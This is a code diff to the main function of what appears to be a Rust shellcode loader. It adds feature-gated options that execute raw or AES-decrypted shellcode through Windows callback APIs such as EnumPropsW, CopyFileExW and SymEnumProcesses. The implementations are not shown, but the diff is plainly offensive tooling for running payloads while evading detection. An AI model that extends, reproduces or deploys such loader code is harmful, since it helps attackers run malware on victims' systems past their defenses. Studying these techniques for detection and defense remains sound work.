@@ -164,6 +164,24 @@ fn main() {
             
             #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
             execution::shellcode_execute_immenuminputcontext(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+            execution::shellcode_execute_enumpropsw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+            execution::shellcode_execute_enumlanguagegrouplocalesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+            execution::shellcode_execute_symenumprocesses(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+            execution::shellcode_execute_copyfileexw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+            execution::shellcode_execute_enumobjects(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+            execution::shellcode_execute_enumresourcetypesw(shellcode);
         }
 
         // Execute shellcode with AES decryption
@@ -218,6 +236,24 @@ fn main() {
                 
                 #[cfg(feature = "ShellcodeExecuteImmEnumInputContext")]
                 execution::shellcode_execute_immenuminputcontext(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumPropsW")]
+                execution::shellcode_execute_enumpropsw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumLanguageGroupLocalesW")]
+                execution::shellcode_execute_enumlanguagegrouplocalesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteSymEnumProcesses")]
+                execution::shellcode_execute_symenumprocesses(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteCopyFileExW")]
+                execution::shellcode_execute_copyfileexw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumObjects")]
+                execution::shellcode_execute_enumobjects(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
+                execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode);
             }
         }
 }
